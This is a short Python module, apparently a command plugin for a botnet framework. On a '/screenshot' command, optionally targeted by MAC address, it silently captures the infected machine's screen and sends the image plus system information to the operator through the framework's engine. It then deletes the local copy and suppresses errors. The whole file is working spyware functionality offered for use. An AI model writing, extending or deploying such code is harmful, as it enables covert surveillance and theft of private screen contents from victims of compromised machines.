import time
import os
from PIL import ImageGrab

from .. import BotNet, Request


@BotNet.default_script(script_version="0.0.1")
def screenshot(request: Request) -> str:
    """get screen shot
    * `[mac-address] /screenshot`
    or
    * `/screenshot`

    example command: 
        * `94945035671481 /screenshot`
        * `/screenshot` \n
    return: img or img-download-link
    """

    file_name = f"{str(time.time()).replace('.', '_')}.png"

    try:
        with open(file_name, "wb") as file:
            screenshot = ImageGrab.grab()
            # Save the image to the file object as a PNG
            screenshot.save(file, "PNG")

    except: # for error "X connection failed: error 5" when screenshot by root user!
        pass

    res = request.engine.send_file(file_name, additionalـinfo=request.system_info(minimal=True))
    os.remove(file_name)

    if res:
        return None
    return "send screen-shot failed!"
